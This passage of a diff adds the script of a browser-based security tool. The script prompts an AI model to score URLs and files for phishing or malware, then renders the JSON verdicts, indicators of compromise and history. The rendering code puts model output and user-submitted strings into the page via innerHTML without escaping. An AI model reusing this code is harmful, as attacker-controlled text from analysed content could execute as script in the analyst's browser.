+{"threat_score":<0-100>,"verdict":"<Clean|Low Risk|Medium Risk|High Risk|Critical Threat>","summary":"<2-3 sentences>","findings":[{"severity":"<critical|high|medium|low>","title":"<short>","detail":"<explanation>"}],"iocs":["<strings>"],"remediation":[{"step":"<title>","detail":"<action>"}],"technique_tags":["<MITRE or technique labels>"]}`,
+
+    url:`You are a senior cybersecurity analyst specializing in phishing and malicious URLs.
+
+URL: ${content}
+Context: ${context}
+
+Analyze for: typosquatting, homograph attacks, suspicious TLDs, redirect chains, credential harvest patterns, social engineering.
+
+Respond ONLY with valid JSON (no markdown fences):
+{"threat_score":<0-100>,"verdict":"<Clean|Suspicious|Likely Phishing|Confirmed Phishing|Malware Distribution>","summary":"<2-3 sentences>","findings":[{"severity":"<critical|high|medium|low>","title":"<short>","detail":"<explanation>"}],"iocs":["<suspicious elements>"],"remediation":[{"step":"<title>","detail":"<action>"}],"technique_tags":["<phishing technique labels>"]}`,
+
+    file:`You are a malware analyst in a sandbox environment. Analyze this file based on its content, strings, and metadata.
+
+File type: ${context}
+Content/metadata:
+${content}
+
+Respond ONLY with valid JSON (no markdown fences):
+{"threat_score":<0-100>,"verdict":"<Clean|Suspicious|Potentially Unwanted|Likely Malware|Confirmed Malware|Ransomware|Trojan|Dropper|Spyware>","summary":"<2-3 sentences>","findings":[{"severity":"<critical|high|medium|low>","title":"<short>","detail":"<explanation>"}],"iocs":["<IOC strings>"],"remediation":[{"step":"<title>","detail":"<action>"}],"technique_tags":["<malware family or MITRE technique labels>"]}`
+  };
+
+  try {
+    const res = await fetch('https://api.anthropic.com/v1/messages',{
+      method:'POST',
+      headers:{
+        'Content-Type':'application/json',
+        'x-api-key': key,
+        'anthropic-version':'2023-06-01',
+        'anthropic-dangerous-direct-browser-access':'true'
+      },
+      body:JSON.stringify({
+        model,
+        max_tokens:1200,
+        messages:[{role:'user',content:prompts[type]}]
+      })
+    });
+    if(!res.ok){
+      const err = await res.json();
+      throw new Error(err.error?.message || `API error ${res.status}`);
+    }
+    const data = await res.json();
+    const raw = data.content.map(i=>i.text||'').join('');
+    const clean = raw.replace(/```json|```/g,'').trim();
+    const r = JSON.parse(clean);
+    renderResult(resultEl, r);
+    // Save to history
+    history.unshift({
+      type, content: content.slice(0,80),
+      score: r.threat_score, verdict: r.verdict,
+      result: r, ts: new Date().toLocaleTimeString()
+    });
+    if(history.length>20) history.pop();
+  } catch(e){
+    resultEl.innerHTML=`<div class="loading-card" style="border-color:rgba(255,77,77,.3)">
+      <p style="color:var(--red);font-size:14px;font-weight:500">Analysis failed</p>
+      <p style="color:var(--text2);font-size:13px;margin-top:6px">${e.message}</p>
+      <p style="color:var(--text3);font-size:12px;margin-top:8px">Check your API key in Settings.</p>
+    </div>`;
+  } finally { btn.disabled=false; }
+}
+
+// ── Render ──
+function scoreColor(s){
+  if(s>=80) return 'var(--red)';
+  if(s>=60) return 'var(--orange)';
+  if(s>=30) return 'var(--yellow)';
+  return 'var(--accent)';
+}
+
+function verdictBadge(v){
+  const vl = (v||'').toLowerCase();
+  let cls='sev-low', icon='✓';
+  if(vl.includes('critical')||vl.includes('confirmed')||vl.includes('ransomware')||vl.includes('phishing')){cls='sev-critical';icon='☠';}
+  else if(vl.includes('high')||vl.includes('malware')||vl.includes('trojan')||vl.includes('dropper')){cls='sev-high';icon='⚠';}
+  else if(vl.includes('medium')||vl.includes('suspicious')||vl.includes('likely')){cls='sev-medium';icon='!';}
+  return `<span class="verdict-badge ${cls}">${icon} ${v}</span>`;
+}
+
+function renderResult(el, r){
+  const sc = r.threat_score||0;
+  const col = scoreColor(sc);
+
+  const findings = (r.findings||[]).map(f=>{
+    const s=f.severity||'low';
+    return `<div class="finding sev-${s}-card">
+      <div class="finding-header">
+        <span class="sev-badge sev-${s}">${s}</span>
+        <span class="finding-title">${f.title||''}</span>
+      </div>
+      <div class="finding-detail">${f.detail||''}</div>
+    </div>`;
+  }).join('');
+
+  const iocs = (r.iocs||[]).filter(Boolean).map(i=>
+    `<div class="ioc"><div class="ioc-dot"></div>${i}</div>`
+  ).join('');
+
+  const steps = (r.remediation||[]).map((s,i)=>
+    `<div class="step"><div class="step-num">${i+1}</div><div class="step-body"><strong>${s.step}</strong><p>${s.detail}</p></div></div>`
+  ).join('');
+
+  const tags = (r.technique_tags||[]).map(t=>`<span class="tag">${t}</span>`).join('');
+
+  el.innerHTML=`
+    <div class="verdict-bar">
+      <div class="score-block">
+        <div class="score-num" style="color:${col}">${sc}</div>
+        <div class="score-label">Threat score</div>
+      </div>
+      <div class="verdict-info">
+        ${verdictBadge(r.verdict)}
+        <div class="verdict-summary">${r.summary||''}</div>
+        ${tags?`<div class="tags-row">${tags}</div>`:''}
+      </div>
+    </div>
+
+    ${findings?`<div class="section-title">Findings</div>${findings}`:''}
+    ${iocs?`<div class="section-title">Indicators of compromise</div>${iocs}`:''}
+    ${steps?`<div class="section-title">Remediation</div><div class="card" style="padding:0 1.25rem">${steps}</div>`:''}
+  `;
+}
+
+// ── History ──
+function renderHistory(){
+  const el = document.getElementById('history-list');
+  if(!history.length){
+    el.innerHTML=`<div class="empty-state"><p>No analyses yet this session.</p><p style="margin-top:4px">Run an analysis and it will appear here.</p></div>`;
+    return;
+  }
+  el.innerHTML = history.map((h,i)=>`
+    <div class="history-item" onclick="showHistoryResult(${i})">
+      <div class="history-type">${h.type}</div>
+      <div class="history-text">${h.content}…</div>
+      <div class="history-score" style="color:${scoreColor(h.score)}">${h.score}</div>
+      <div style="font-size:11px;color:var(--text3);flex-shrink:0">${h.ts}</div>
+    </div>`).join('');
+}
+
+function showHistoryResult(i){
+  const h = history[i];
+  showPanel(h.type);
+  const el = document.getElementById('result-'+h.type);
+  el.classList.add('show');
+  renderResult(el, h.result);
+}
+
+// ── Init ──
+updateStatus();
+</script>
+</body>
+</html>
